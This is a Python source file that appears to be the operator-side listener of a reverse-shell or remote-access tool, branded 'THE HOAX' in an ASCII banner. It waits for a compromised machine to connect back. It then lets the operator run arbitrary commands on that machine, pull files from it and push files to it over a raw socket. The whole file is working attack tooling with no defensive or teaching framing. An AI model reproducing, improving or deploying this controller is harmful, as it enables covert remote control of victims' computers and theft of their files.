import socket
global host
global port
from termcolor import colored , cprint
import json
import  sys
import time

class server:
    def __init__(self , port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.port = port
        self.host = ""
    def connection(self):
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
            cprint("connecting............","yellow")
            self.conn , address = self.s.accept()
            cprint(f"[+]CONNECTED[+] address {address}", "blue")
            msg = self.conn.recv(1024)
            print(msg.decode())
            self.enter_commands()
        except socket.error as msg:
            cprint("wait..reconnecting","red")
            self.connection()

    def enter_commands(self):
        while True:

            cmd = input("enter the command >>>")
            if cmd == "exit":
                self.send_commands( cmd)
                self.conn.close()
                sys.exit()
            elif cmd[:8] == "download":
                self.send_commands(cmd)
                msg = self.recv_data()
                print(self.write_file(cmd[9:], msg))
            elif cmd[:6] == "upload":
                file_content = self.read_file(cmd[7:])

                cmd = cmd +  file_content
                print(cmd)
                self.send_commands(cmd)
                msg = self.recv_data()
                print(msg)
            else:
                self.send_commands( cmd)
                msg = self.recv_data()
                print(msg)

    def send_commands(self, cmd):
        cmd = json.dumps(cmd)
        cmd = cmd.encode()
        self.conn.send(cmd)

    def recv_data(self):
        msg = ""
        while True:
            try:
                m = self.conn.recv(1024).decode()
                msg = msg + m
                return json.loads(msg)
            except ValueError:
                continue

    def write_file(self ,path, msg):
        with open("downloaded_" + path, "wb") as f:
            f.write(msg.encode())
            return "writed successfully"

    def read_file(self , path):
        with open(path , "r") as f:
            return f.read()



print(colored(r'''
    --------- |     | 0000000    /\    /\     0000   0000000000000000000000000000000000000000000000
        |     |_____| 0  o  0   /  \  /  \   0    0  0                       0000000     0000      00000000
        |     |     | 0  o  0  /    \/    \  000000  0000000                 0          0    0        0
        |     |     | 0000000 /            \ 0    0         0       THE      0          000000        0
        |                    /              \               0                0000000    0    0        0
        | 000000000000000000000000000000000000000000000000000
        |                                   
                                                        --- THE HOAX
''',"blue",attrs=["bold" , "underline"]))


port = int(input("enter the port to listen on:"))
s = server(port)
s.connection()
